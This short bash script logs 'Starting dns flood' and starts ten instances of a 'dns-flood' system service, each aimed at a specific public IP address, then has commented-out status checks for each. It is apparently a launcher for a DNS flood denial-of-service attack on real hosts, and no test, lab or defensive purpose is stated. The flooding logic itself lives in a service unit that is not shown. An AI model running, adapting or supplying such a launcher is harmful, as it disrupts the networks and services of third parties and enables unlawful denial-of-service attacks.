#!/bin/bash
logger -s -t $0 "Starting dns flood"
/usr/sbin/service dns-flood@27.128.0.22 start &
/usr/sbin/service dns-flood@175.45.178.14 start &
/usr/sbin/service dns-flood@109.230.200.205 start &
/usr/sbin/service dns-flood@27.128.6.46 start &
/usr/sbin/service dns-flood@175.45.178.85 start &
/usr/sbin/service dns-flood@109.230.200.201 start &
/usr/sbin/service dns-flood@27.128.200.9 start &
/usr/sbin/service dns-flood@175.45.178.163 start &
/usr/sbin/service dns-flood@109.230.200.79 start &
/usr/sbin/service dns-flood@27.128.41.120 start 


sleep 5;
#/usr/sbin/service dns-flood@27.128.0.22 status 
#/usr/sbin/service dns-flood@175.45.178.14 status
#/usr/sbin/service dns-flood@109.230.200.205 status
#/usr/sbin/service dns-flood@27.128.6.46 status
#/usr/sbin/service dns-flood@175.45.178.85 status
#/usr/sbin/service dns-flood@109.230.200.201 status
#/usr/sbin/service dns-flood@27.128.200.9 status
#/usr/sbin/service dns-flood@175.45.178.163 status
#/usr/sbin/service dns-flood@109.230.200.79 status
#/usr/sbin/service dns-flood@27.128.41.120 status


